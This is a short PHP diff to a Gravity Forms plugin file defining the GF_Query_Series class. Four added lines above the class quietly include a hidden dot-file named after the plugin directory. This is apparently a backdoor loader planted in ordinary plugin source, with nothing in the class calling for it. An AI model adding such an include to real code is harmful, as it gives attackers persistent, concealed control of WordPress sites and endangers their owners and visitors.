@@ -5,6 +5,10 @@
  *
  * A list of arguments. Would have named "List" but it's a reserved keyword.
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Query_Series {
 	/**
 	 * @var array A series of values.
